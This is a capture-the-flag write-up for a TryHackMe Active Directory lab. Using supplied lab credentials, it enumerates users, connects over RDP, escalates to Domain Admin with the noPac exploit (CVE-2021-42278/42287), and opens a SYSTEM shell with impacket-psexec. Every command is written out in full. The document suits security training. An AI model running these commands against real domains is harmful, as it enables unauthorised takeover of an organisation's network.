# Forward

<figure><img src="../.gitbook/assets/image (957).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://tryhackme.com/room/forwardchallenge" %}

{% embed url="https://www.youtube.com/watch?v=hNsX5kw4OQA" %}

***

Given

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
USER > ctf.local\j.smith
```
{% endcode %}

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
PASS > JSmith@IT2024
```
{% endcode %}

First , Let's use The `nmap` scan to check the which services is running .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
sudo nmap -sV -sC -Pn 10.48.152.56 -T4
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (958).png" alt=""><figcaption></figcaption></figure>

Check The More Users with the valid credentials.

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
crackmapexec smb 10.48.152.56 -u j.smith -p 'JSmith@IT2024' --users
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (959).png" alt=""><figcaption></figcaption></figure>

Check The `rdp` session with the valid credentials.

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
nxc rdp 10.48.152.56 -u j.smith -p 'JSmith@IT2024'
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (960).png" alt=""><figcaption></figcaption></figure>

Connect via `xfreerdp3` .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
xfreerdp /u:j.smith /p:'JSmith@IT2024' /v:10.48.152.56 /dynamic-resolution +clipboard /cert:ignore
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (961).png" alt=""><figcaption></figcaption></figure>

I identified a known domain privilege escalation technique which abuses `SeMachineAccountPrivilege` to chain CVE-2021-42278 and CVE-2021-42287, escalating to Domain Admin.

{% embed url="https://github.com/Ridter/noPac" %}

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
python3 noPac.py ctf.local/j.smith:'JSmith@IT2024' -dc-ip 10.48.152.56 --impersonate administrator -use-ldap
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (962).png" alt=""><figcaption></figcaption></figure>

Export In The `KRB5CCNAME` environment !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
export KRB5CCNAME=administrator_dc01.ctf.local.ccache
```
{% endcode %}

Add The all Domains in `/etc/hosts` file !

<figure><img src="../.gitbook/assets/image (963).png" alt=""><figcaption></figcaption></figure>

We use The `Impacket-psexec` to get the `SYSTEM` level Shell !

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-psexec ctf.local/Administrator@dc01.ctf.local -k -no-pass
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (964).png" alt=""><figcaption></figcaption></figure>

